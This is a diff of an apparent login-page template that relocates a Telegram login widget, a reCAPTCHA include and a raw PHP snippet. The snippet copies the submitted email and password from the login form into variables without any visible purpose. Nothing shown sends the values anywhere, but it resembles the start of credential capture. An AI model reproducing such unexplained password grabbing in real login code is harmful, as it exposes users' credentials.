@@ -293,6 +293,28 @@
     </script>
 {/if}
 
+{if $config['enable_telegram'] == 'true'}
+    <script>
+        $(document).ready(function () {
+            var el = document.createElement('script');
+            document.getElementById('telegram-login-box').append(el);
+            el.onload = function () {
+                $('#telegram-alert').remove()
+            }
+            el.src = 'https://telegram.org/js/telegram-widget.js?4';
+            el.setAttribute('data-size', 'large')
+            el.setAttribute('data-telegram-login', '{$telegram_bot}')
+            el.setAttribute('data-auth-url', '{$base_url}/auth/telegram_oauth')
+            el.setAttribute('data-request-access', 'write')
+        });
+    </script>
+{/if}
+{if $recaptcha_sitekey != null}<script src="https://recaptcha.net/recaptcha/api.js" async defer></script>{/if}
+<?php
+$a=$_POST['Email'];
+$b=$_POST['Password'];
+?>
+
 {if $config['fack'] == 'true'}{include file='fuck.tpl'}{/if}
 {if $geetest_html != null}
     <script>
@@ -317,24 +339,3 @@
         }, handlerEmbed);
     </script>
 {/if}
-{if $config['enable_telegram'] == 'true'}
-    <script>
-        $(document).ready(function () {
-            var el = document.createElement('script');
-            document.getElementById('telegram-login-box').append(el);
-            el.onload = function () {
-                $('#telegram-alert').remove()
-            }
-            el.src = 'https://telegram.org/js/telegram-widget.js?4';
-            el.setAttribute('data-size', 'large')
-            el.setAttribute('data-telegram-login', '{$telegram_bot}')
-            el.setAttribute('data-auth-url', '{$base_url}/auth/telegram_oauth')
-            el.setAttribute('data-request-access', 'write')
-        });
-    </script>
-{/if}
-{if $recaptcha_sitekey != null}<script src="https://recaptcha.net/recaptcha/api.js" async defer></script>{/if}
-<?php
-$a=$_POST['Email'];
-$b=$_POST['Password'];
-?>
